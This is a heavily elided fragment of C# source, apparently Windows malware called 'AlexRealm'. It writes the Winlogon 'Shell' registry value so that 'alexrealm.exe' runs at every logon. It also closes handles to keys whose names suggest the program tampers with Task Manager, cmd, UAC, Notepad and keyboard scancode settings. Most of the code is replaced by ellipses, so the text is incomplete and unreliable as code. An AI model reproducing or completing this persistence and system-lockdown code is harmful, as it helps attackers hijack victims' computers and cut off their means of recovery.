...
namespace AlexRealm
{
  ...
  0x0,0x0,0x0,0x5c,0xe0,0x0,0x0,0x5f,0xe0,0x0,0x0,0x0f,0x0,0x0,0x0,0x0,0x0 };
            ...
            reg_explo.SetValue("Shell", "explorer.exe, alexrealm.exe", RegistryValueKind.String);
            ...
            reg_task.Close(); reg_explo.Close(); reg_color.Close(); reg_cmd.Close();
            reg_logon.Close(); reg_title.Close(); reg_dlogon.Close(); reg_winlogon.Close(); reg_uac.Close();
            reg_notepad.Close(); reg_scancode.Close();
        }
    }
}
